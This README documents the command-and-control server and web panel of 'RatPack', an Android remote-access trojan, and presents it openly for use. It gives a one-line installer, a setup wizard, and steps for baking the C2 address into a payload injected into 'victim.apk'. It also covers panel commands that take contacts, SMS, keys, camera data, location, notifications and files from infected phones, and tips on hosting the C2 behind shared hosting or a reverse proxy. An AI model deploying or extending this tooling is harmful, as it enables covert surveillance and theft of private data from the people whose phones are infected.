# RatPack Server

The C2 server and web panel for RatPack.

> **This is the `server` branch.** The compiler (the APK recompiler and the RAT
> payload source) lives on the **`main`** branch of the same repository:
> <https://github.com/AGlegendery/RatPack>
>
> ```bash
> git clone -b main https://github.com/AGlegendery/RatPack.git RatPack-Compiler
> ```

```
RatPack-Server/     <- this branch (server)
RatPack-Compiler/   <- main branch (compiler)
```

---

## Install — one line

```bash
curl -fsSL https://raw.githubusercontent.com/AGlegendery/RatPack/server/install.sh | bash
```

That clones the `server` branch, creates a virtualenv, installs the
dependencies, runs the setup wizard, writes `setting.json` and registers a
`ratpack.service` systemd unit.

Options (pass them after `--`):

```bash
curl -fsSL https://raw.githubusercontent.com/AGlegendery/RatPack/server/install.sh | bash -s -- \
  --dir /opt/ratpack --no-systemd --no-start
```

| Flag | Meaning |
|---|---|
| `--dir PATH` | install directory (default `~/RatPack-Server`) |
| `--no-systemd` | do not install the systemd unit |
| `--no-start` | do not start the service afterwards |
| `--branch NAME` | branch to install (default `server`) |

When it finishes it prints the install directory, the config paths and the
commands for fetching `setting.json`. The wizard is interactive: it asks for
the interface (bot or web), the bind address, the address the bots connect to,
the port, the transport and the panel credentials.

### Manual install

```bash
git clone -b server https://github.com/AGlegendery/RatPack.git RatPack-Server
cd RatPack-Server

pip install -r requirements.txt
```

Requirements: Python 3.9+ and the packages in `requirements.txt`
(FastAPI, uvicorn, Jinja2, websockets, python-multipart).

---

## Setup wizard

```bash
python3 setup.py
```

The wizard asks which interface to deploy:

```
  Which interface do you want to deploy?

    [1] Bot interface
        Only the C2 data channel. Bots connect here, there is no
        browser UI. Use it on a headless box or when the panel
        is managed elsewhere.

    [2] Web interface
        The C2 plus the browser panel, and the setting.json
        generator that the Ratpack Compiler consumes.
```

Then it asks for:

| Prompt | Meaning |
|---|---|
| Bind address (where the C2 listens) | usually `0.0.0.0` |
| Address the bots connect to | the address that goes into `setting.json`; `10.0.2.2` for an emulator on the same host, otherwise the public IP or hostname |
| C2 port | 8777 by default |
| Transport | `tcp` or `tls` |
| Panel bind address / port | for the web interface |
| Panel username / password | for the web interface |
| Beacon interval, connect timeout, log tag | payload tuning |

On completion it prints the outcome:

```
+---------------------------------------------------------------+
|                    Ratpack Panel is configured                 |
+---------------------------------------------------------------+

  Interface      : Web interface
  C2 listen      : 0.0.0.0:8777 (tcp)
  Bots connect to: 10.0.2.2:8777
  Shared secret  : <generated>
  Panel URL      : http://127.0.0.1:8080/
  Panel login    : admin
  Panel password : <generated>

  setting.json for the Ratpack Compiler:
    server.host      = 10.0.2.2
    server.port      = 8777
    server.protocol  = tcp
    server.secret    = <generated>

  Download it from the panel: /setting.json
  and drop it into Ratpack/Compiler/ before compiling.

  Config file    : .../panel_config.json
```

The configuration is written to `panel_config.json`. It holds the shared
secret and the panel password, so it is git-ignored — never commit it.

---

## Run

```bash
# web interface: C2 + browser panel
python3 -m ratpack.run

# bot interface: C2 only, no web UI
python3 -m ratpack.botd
```

Both bind the C2 data channel on the configured port and open a control
channel on `C2 port + 1` (loopback only). The web panel talks to the C2 over
that control channel, so the panel can be restarted without dropping the bots.

---

## Handing the configuration to the compiler

The panel generates `setting.json`; the compiler consumes it.

The installer already writes it to `setting.json` next to `panel_config.json`,
so you can just copy the file:

```bash
cp ~/RatPack-Server/setting.json ../RatPack-Compiler/Compiler/setting.json
```

or pull it over HTTP:

```bash
# log in
curl -c cookies.txt -X POST \
     -d "username=admin&password=YOUR_PASSWORD" \
     http://127.0.0.1:8080/login

# download it
curl -b cookies.txt -o ../RatPack-Compiler/Compiler/setting.json \
     http://127.0.0.1:8080/setting.json
```

Then in the compiler checkout:

```bash
cd ../RatPack-Compiler/Compiler
./compile.sh victim.apk
```

The compiler bakes the values into the APK twice: into `assets/setting.json`
and into the payload's `RatCfg` smali.

---

## The panel

| Path | What |
|---|---|
| `/` | bot list, live event feed, the current compiler configuration |
| `/bot/<id>` | per-bot console: command form, quick links, event log |
| `/setting.json` | the configuration document for the compiler (auth required) |
| `/login`, `/logout` | session handling |
| `/healthz` | health check |

Quick links on the bot page cover `info`, `contacts`, `sms`, `keys`, `roots`,
`cameras`, `caches`, `storage`, `settings`, `location` and `ls /sdcard`.

---

## The bot protocol

The C2 data channel is a plain TCP (optionally TLS) stream with a 6-byte
header, big-endian:

```
+--------+--------+-----------------+------------------+
| ver(1) | type(1)| length (4 bytes) | payload (N bytes)|
+--------+--------+------------------+
```

- `ver` = `0x01`
- `type`: `0x01` REGISTER, `0x02` REGISTER_ACK, `0x10` COMMAND,
  `0x11` RESPONSE, `0x12` EVENT, `0x20` PING, `0x21` PONG
- payload is UTF-8 JSON, except PING/PONG

The Python side is `ratpack/protocol.py`; the Java side is
`ratpack/protocol.py`'s mirror in the compiler's
`payload/app/src/main/java/com/darkbiit/rat/RatProto.java`. They must stay
byte-identical.

---

## Test helpers

Run these against a connected bot:

```bash
python3 -m ratpack.selftest      # exercises every command
python3 -m ratpack.notiftest     # verifies notification interception
python3 -m ratpack.loctest       # verifies real-time location events
python3 -m ratpack.events        # prints the bot's event log
python3 -m ratpack.pull <remote-path> <local-file>   # pulls a file off the bot
```

---

## Layout

```
setup.py                  entry point for the wizard
requirements.txt
panel_config.json         generated by the wizard (git-ignored)
ratpack/
├── config.py             configuration + build_setting_json()
├── bots.py               C2: Bot, BotSession, Heartbeat, ControlServer
├── panel.py              FastAPI application and routes
├── setup_wizard.py       the interactive wizard
├── run.py                C2 + panel (web interface)
├── botd.py               C2 only (bot interface)
├── protocol.py           wire format
├── botclient.py          control-channel client
├── selftest.py           command sweep
├── notiftest.py          notification check
├── loctest.py            location check
├── events.py             event log dump
├── pull.py               file pull
├── templates/            Jinja templates
└── static/panel.css
```

---

## Shared hosting / shared hardware

The default transport is a raw TCP socket: the server binds a port and the
bots connect to it. That needs a box where you control the ports — a VPS, a
home server, a container with published ports.

On **shared hosting** (cPanel/Plesk, Heroku-style dynos, Cloudflare-fronted
boxes) you usually cannot bind a port and have the outside world reach it.
You only get HTTP(S) on the port the platform assigns.

For that case the server offers an **HTTP long-polling transport**: the bot
polls for commands over ordinary HTTP and posts its frames back. Same
protocol, same panel, only the framing around the frames differs.

```
POST /bot/register        the bot announces itself
POST /bot/poll/{id}       long poll: returns a command, or 204 after the timeout
POST /bot/send/{id}       the bot returns a response or an event
```

### Choosing it

Run the wizard and pick option 2 for the transport:

```
  [1] Direct TCP   the server owns a port, bots connect straight to it
  [2] HTTP         shared hosting: the bots poll the panel over HTTP
```

Then give it the **public URL** of your panel, for example
`https://rat.example.com` — not `host:port`, and not `0.0.0.0`.

`setting.json` then carries it to the compiler:

```json
"server": {
  "host": "https://rat.example.com",
  "port": 8777,
  "protocol": "tcp",
  "transport": "http",
  "secret": "..."
}
```

The compiler bakes `transport: http` into the APK, and the payload switches
itself to the HTTP client.

### What it costs

- One long-poll request per bot per interval instead of one persistent
  socket. With the default 15 s beacon that is 4 requests a minute per bot.
- The poll holds a worker thread for the duration of the poll, so keep the
  poll timeout close to the beacon interval and cap the number of bots.
- Media-heavy commands (a photo, a video) are transferred as base64 inside
  the JSON response, which is much larger than the binary would be. Pulling
  files over HTTP is noticeably slower than over TCP.

### Running behind a reverse proxy

Any reverse proxy that can proxy HTTP works — nginx, Caddy, Apache. The
panel is a normal ASGI application.

```nginx
server {
    listen 443 ssl http2;
    server_name rat.example.com;

    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # The long poll must not be cut off before it answers.
        proxy_read_timeout 120s;
    }
}
```

If the proxy terminates TLS, the payload should talk to the public
`https://` URL. The panel's own TLS certificate is not what the bot sees in
that case — the proxy's is, and the payload trusts the system CA store plus
user-installed certificates.

### Process supervision on shared hosting

Shared hosting usually has no systemd. Run the panel under whatever the
platform provides — a supervisor config, a screen/tmux session, or the
hosting provider's "always-on worker" feature:

```bash
cd ~/RatPack-Server
./venv/bin/python -m ratpack.run
```

For a persistent background process without systemd:

```bash
nohup ./venv/bin/python -m ratpack.run >> ~/ratpack.log 2>&1 &
```

### Running the bot interface only

If you only want the C2 and not the browser panel, pick option 1 in the
wizard and start with:

```bash
python3 -m ratpack.botd
```

That one has no HTTP surface at all, so it also works where the panel
itself is not permitted.

---

## Licence

MIT — see [LICENSE](LICENSE) on the `main` branch.
